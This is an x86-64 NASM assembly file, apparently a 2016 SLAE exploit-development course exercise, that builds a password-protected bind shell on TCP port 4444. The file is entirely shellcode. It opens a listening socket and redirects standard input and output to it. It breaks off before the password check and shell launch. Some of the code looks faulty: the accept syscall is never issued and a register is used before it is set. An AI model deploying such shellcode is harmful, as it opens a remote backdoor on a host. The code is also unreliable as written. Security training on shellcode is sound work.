;------------------------------
; bind-shell-pass.nasm
; by Michael Born
; Student ID: SLAE-1439
; November 5, 2016
;------------------------------


; purpose: password protected bind shell

global _start

section .text

_start:

	; socket syscall
	; define __NR_socket 41
	; 

	xor rax, rax		; initialize rax
	mov al, 0x29		; int socket(int domain, int type, int protocol)
	xor rdi, rdi		;
	add rdi, 0x2		; AF_INET
	xor rsi, rsi		;
	add rsi, 0x1		; SOCK_STREAM
	xor rdx, rdx		;
	add rdx, 0x6		; TCP
	syscall			; syscall

	; save socketfd for later

	mov rdi, rax		; socketfd into rdi


	
	; define __NR_bind 49
	; struct sockaddr_in {
	;      sa_family_t    sin_family address family: AF_INET
        ;      in_port_t      sin_port   port in network byte order 
        ;      struct in_addr sin_addr   internet address


	xor rax, rax		; initialize rax
	mov al, 0x31		; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	xor rdx, rdx		; initialize rdx
	mov dl, 0x10		; socklen_t addrlen (16)
	push r15		; int sockfd
	pop rdi			;
	xor rsi, rsi		; initialize rsi
	mov [rsp - 0x4], esi	; IP Addr 0.0.0.0
	mov [rsp - 0x6], 0x5c11	; Port 4444
	mov [rsp - 0xa], esi	; null byte
	mov [rsp - 0x8], 0x2	; AF_INET
	sub rsp, 0x8 
	mov rsi, esp		; pointer to NULL byte
	syscall			; syscall

	
	; define __NR_listen 50

	xor rax, rax
	mov al, 0x32		; int listen(int sockfd, int backlog)
	xor rsi, rsi		; initialize rsi
	inc rsi			; int backlog
	syscall			; syscall
	

	; define __NR_accept 43

	xor rax, rax
	push rax
	mov al, 0x2b		; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	mov rsi, rsp		; struct sockaddr *addr
	push byte 0x10		; 
	mov rdx, rsp		; socklen_t *addrlen

	xor r15, r15		; initialize r15
	mov r15, rdi		; save sockfd just in case
	mov rdi, rax		; acceptfd for later

	; define __NR_dup2 33

	xor rax, rax
	mov al, 0x21		; int dup2(int oldfd, int newfd)
	xor rsi, rsi		; int newfd (0 for stdin)
	syscall			; syscall
	xor rax, rax		;
	mov al, 0x21		; int dup2(int oldfd, int newfd)
	inc rsi			; int newfd (now 1 for std out)
	syscall			; syscall
	xor rax, rax		;
	mov al, 0x21		; int dup2(int oldfd, int newfd)
	inc rsi			; int newfd (2 for stdout)
	syscall			; syscall


	; ssize_t send(int sockfd, const void *buf, size_t len, int flags)
